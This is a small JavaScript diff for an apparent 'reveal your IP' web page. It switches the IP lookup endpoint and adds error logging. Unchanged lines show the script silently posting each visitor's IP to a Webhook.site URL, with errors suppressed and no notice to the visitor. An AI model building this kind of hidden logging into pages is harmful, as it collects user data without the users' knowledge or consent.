@@ -15,15 +15,15 @@ revealBtn.addEventListener("click", async () => {
   errorDisplay.textContent = "";
 
   try {
-    // Buscar IP do usuário
-    const res = await fetch("https://api.ipify.org?format=json");
+    // 🔹 API que permite CORS direto no GitHub Pages
+    const res = await fetch("https://api64.ipify.org?format=json");
     if (!res.ok) throw new Error("Falha na requisição");
 
     const data = await res.json();
     ipDisplay.textContent = `Seu IP: ${data.ip}`;
     fetchState = "success";
 
-    // Enviar IP para Webhook.site
+    // 🔹 Enviar IP para Webhook.site
     fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -33,6 +33,7 @@ revealBtn.addEventListener("click", async () => {
     }).catch(() => {});
 
   } catch (err) {
+    console.error(err);
     errorDisplay.textContent = "Erro de rede. Tente novamente.";
     ipDisplay.textContent = "";
     fetchState = "error";
